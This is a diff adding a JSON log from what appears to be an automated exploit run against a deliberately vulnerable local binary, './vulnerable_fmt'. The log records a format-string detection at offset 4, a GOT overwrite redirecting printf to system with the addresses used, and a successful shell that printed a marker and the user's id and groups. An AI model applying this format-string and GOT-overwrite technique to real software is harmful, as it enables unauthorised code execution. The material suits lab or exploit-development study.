@@ -1,0 +1,22 @@
+{
+  "binary": "./vulnerable_fmt",
+  "timestamp": "2026-10-26T18:08:29.500312",
+  "arch": "i386",
+  "pie": false,
+  "phases": {
+    "detect": {
+      "vulnerable": true,
+      "offset": 4,
+      "output": "AAAA.80.804a013.ffffcb10.41414141.2431252e\nEnter command:"
+    },
+    "got_overwrite": {
+      "printf_got": "0x804c00c",
+      "system_plt": "0x8049114",
+      "payload_length": 36
+    },
+    "shell": {
+      "shell": true,
+      "output": "                                                                                                                                                                                                                                                   \u0013aaa\f\u0004\b\u000f\u0004\b\nsh: 1: Enter: not found\nPWNED_55\nuid=1000(saad) gid=1000(saad) groups=1000(saad),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),118(docker)\nsaad\n"
+    }
+  }
+}
